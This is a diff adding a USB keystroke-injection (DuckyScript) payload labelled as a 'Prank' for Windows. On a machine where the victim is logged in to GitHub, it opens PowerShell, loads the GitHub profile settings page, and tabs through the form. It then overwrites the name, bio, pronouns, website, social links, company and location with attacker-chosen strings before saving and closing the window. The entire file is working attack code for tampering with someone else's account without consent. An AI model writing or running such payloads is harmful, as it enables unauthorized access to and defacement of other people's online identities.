@@ -1,0 +1,103 @@
+REM ###################################################
+REM #                                                 |
+REM # Title        : Change Github Profile Settings   |
+REM # Author       : Aleff                            |
+REM # Version      : 1.0                              |
+REM # Category     : Prank                            |
+REM # Target       : Windows 10/11                    |
+REM #                                                 |
+REM ###################################################
+
+
+REM Requirements:
+REM     - Internet connection
+REM     - Logged in Github
+
+
+DELAY 1000
+GUI r
+DELAY 500
+STRINGLN powershell
+DELAY 500
+
+STRINGLN Start-Process "https://github.com/settings/profile"; exit;
+REM It depends by the computer power and by the internet connection power
+DELAY 2000
+
+TAB
+TAB
+TAB
+TAB
+TAB
+TAB
+TAB
+TAB
+TAB
+TAB
+TAB
+TAB
+TAB
+TAB
+TAB
+TAB
+TAB
+TAB
+TAB
+TAB
+TAB
+TAB
+TAB
+TAB
+TAB
+TAB
+TAB
+TAB
+TAB
+TAB
+TAB
+TAB
+TAB
+TAB
+TAB
+TAB
+TAB
+REM Here you should define the new name
+STRING NAME
+TAB
+TAB
+TAB
+TAB
+REM Here you should define the new Biography
+STRING BIO
+TAB
+DOWNARROW
+DOWNARROW
+DOWNARROW
+DOWNARROW
+REM Here you should define the custom pronouns
+STRING CUSTOM-PRONOUNS
+TAB
+REM Here you should define the new personal website url
+STRING URL
+TAB
+REM Here you should define the new social network links
+STRING SOCIAL-ACCOUNT-1
+TAB
+STRING SOCIAL-ACCOUNT-2
+TAB
+STRING SOCIAL-ACCOUNT-3
+TAB
+STRING SOCIAL-ACCOUNT-4
+TAB
+REM Here you should define the new company
+STRING COMPANY
+TAB
+REM Here you should define the new location
+STRING LOCATION
+TAB
+TAB
+TAB
+TAB
+ENTER
+DELAY 2000
+ALT-F4
